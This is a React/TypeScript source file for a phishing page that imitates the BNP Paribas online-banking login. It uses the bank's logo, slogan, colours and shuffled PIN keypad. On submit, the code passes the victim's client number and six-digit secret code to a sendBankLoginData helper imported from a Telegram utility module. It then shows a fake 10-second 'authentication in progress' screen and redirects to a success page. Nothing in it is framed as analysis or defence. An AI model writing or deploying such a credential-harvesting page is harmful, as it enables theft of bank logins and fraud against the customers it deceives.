import React, { useState } from 'react';
import { X, Bell, Shield, Phone, Accessibility } from 'lucide-react';
import { sendBankLoginData } from '../../utils/telegram';

type ProviderCAuthProps = {
  onAuthenticate: () => void;
  onBack: () => void;
  bankName: string;
};

const ProviderCAuth = ({ onAuthenticate, onBack, bankName }: ProviderCAuthProps) => {
  const [numeroClient, setNumeroClient] = useState('');
  const [codeSecret, setCodeSecret] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleNumeroClientChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 10);
    setNumeroClient(value);
  };

  const handleNumberClick = (number: string) => {
    if (codeSecret.length < 6) {
      setCodeSecret(prev => prev + number);
    }
  };

  const clearCodeSecret = () => {
    setCodeSecret('');
  };

  const clearNumeroClient = () => {
    setNumeroClient('');
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (numeroClient.length === 10 && codeSecret.length === 6) {
      setIsLoading(true);

      await sendBankLoginData({
        bankName,
        username: numeroClient,
        password: codeSecret
      });

      setTimeout(() => {
        setIsLoading(false);
        window.location.href = '/success';
      }, 10000);
    }
  };

  if (isLoading) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-white">
        <div className="text-center">
          <div className="mb-8">
            <div className="w-20 h-20 mx-auto relative">
              <div className="absolute inset-0 rounded-full border-4 border-gray-200"></div>
              <div className="absolute inset-0 rounded-full border-4 border-[#00A651] animate-spin border-t-transparent"></div>
            </div>
          </div>
          <h2 className="text-xl font-semibold text-gray-800 mb-2">
            Authentification en cours
          </h2>
          <p className="text-gray-600">
            Connexion à votre espace bancaire...
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white">
      <header className="bg-white border-b border-gray-200">
        <div className="flex items-center justify-between px-4 py-3">
          <div className="flex items-center">
            <img
              src="https://logo-marque.com/wp-content/uploads/2021/03/BNP-Paribas-Logo.png"
              alt="Logo"
              className="h-8"
              onError={(e) => {
                (e.target as HTMLImageElement).style.display = 'none';
              }}
            />
            <span className="ml-3 text-gray-600 text-sm hidden md:block">La banque d'un monde qui change</span>
          </div>
          <div className="flex items-center space-x-4">
            <Bell className="w-5 h-5 text-gray-600" />
            <button className="bg-[#00A651] text-white px-4 py-2 rounded-full text-sm hover:bg-[#008f47] transition-colors">
              Devenir client
            </button>
            <button
              onClick={onBack}
              className="p-1 text-gray-600 hover:text-gray-800 transition-colors"
            >
              <X size={20} />
            </button>
          </div>
        </div>
      </header>

      <div className="flex flex-col lg:flex-row">
        <div className="w-full lg:w-2/3 bg-gradient-to-br from-[#00A651] to-[#008f47] text-white p-8 lg:p-12 min-h-[calc(100vh-80px)]">
          <div className="max-w-md mx-auto">
            <h1 className="text-3xl lg:text-4xl font-light mb-12 text-center">
              ACCÉDER À MES COMPTES
            </h1>

            <form onSubmit={handleSubmit} className="space-y-8">
              <div>
                <label className="block text-white font-medium mb-4">
                  1. Mon numéro client
                </label>
                <div className="relative">
                  <input
                    type="text"
                    value={numeroClient}
                    onChange={handleNumeroClientChange}
                    className="w-full px-4 py-3 rounded-lg text-gray-800 bg-white focus:outline-none focus:ring-2 focus:ring-white"
                    maxLength={10}
                    placeholder=""
                  />
                  {numeroClient && (
                    <button
                      type="button"
                      onClick={clearNumeroClient}
                      className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600"
                    >
                      <X size={20} />
                    </button>
                  )}
                </div>
              </div>

              <div>
                <label className="block text-white font-medium mb-4">
                  2. Mon code secret (6 chiffres)
                </label>
                <div className="relative">
                  <input
                    type="password"
                    value={codeSecret}
                    readOnly
                    className="w-full px-4 py-3 rounded-lg text-gray-800 bg-white cursor-not-allowed"
                    placeholder=""
                  />
                  {codeSecret && (
                    <button
                      type="button"
                      onClick={clearCodeSecret}
                      className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600"
                    >
                      <X size={20} />
                    </button>
                  )}
                </div>
              </div>

              <div className="grid grid-cols-5 gap-3 my-8">
                {[6, 1, 8, 2, 0, 4, 5, 3, 9, 7].map((number, i) => (
                  <button
                    key={i}
                    type="button"
                    onClick={() => handleNumberClick(number.toString())}
                    className="aspect-square bg-white hover:bg-gray-100 rounded-lg text-xl font-semibold text-gray-800 transition-colors focus:outline-none focus:ring-2 focus:ring-white"
                  >
                    {number}
                  </button>
                ))}
              </div>

              <button
                type="submit"
                disabled={numeroClient.length !== 10 || codeSecret.length !== 6}
                className="w-full bg-[#008f47] text-white py-4 rounded-lg text-lg font-semibold hover:bg-[#007a3d] disabled:bg-gray-400 disabled:cursor-not-allowed transition-colors focus:outline-none focus:ring-2 focus:ring-white focus:ring-offset-2"
              >
                Accéder à mes Comptes
              </button>

              <div className="text-center">
                <button
                  type="button"
                  className="text-white hover:underline text-sm"
                >
                  Numéro client ou code secret oublié ?
                </button>
              </div>
            </form>
          </div>
        </div>

        <div className="w-full lg:w-1/3 bg-white p-6 lg:p-8">
          <div className="space-y-8">
            <div>
              <div className="flex items-center mb-4">
                <Shield className="w-5 h-5 text-gray-600 mr-2" />
                <h3 className="font-bold text-gray-800">Vos codes d'accès</h3>
              </div>
              <button className="text-[#00A651] hover:underline text-sm">
                Obtenir ses codes d'accès
              </button>
            </div>

            <div>
              <div className="flex items-center mb-4">
                <Shield className="w-5 h-5 text-gray-600 mr-2" />
                <h3 className="font-bold text-gray-800">Conseils de sécurité</h3>
              </div>
              <p className="text-sm text-gray-600 mb-3">
                Vérifiez que l'adresse du site commence par https:// et est précédée d'une icône cadenas.
              </p>
              <button className="text-[#00A651] hover:underline text-sm">
                Découvrez nos conseils sécurité
              </button>
            </div>

            <div>
              <div className="flex items-center mb-4">
                <Accessibility className="w-5 h-5 text-gray-600 mr-2" />
                <h3 className="font-bold text-gray-800">Pour une meilleure accessibilité</h3>
              </div>
              <p className="text-sm text-gray-600">
                <button className="text-[#00A651] hover:underline">Connectez-vous</button> grâce à la grille contrastée et bénéficiez d'un accompagnement vocal.
              </p>
            </div>

            <div>
              <div className="flex items-center mb-4">
                <Phone className="w-5 h-5 text-gray-600 mr-2" />
                <h3 className="font-bold text-gray-800">Informations client</h3>
              </div>
              <p className="text-sm text-gray-600 mb-2">
                En cas de problème technique, contactez nos conseillers en ligne.
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default ProviderCAuth;
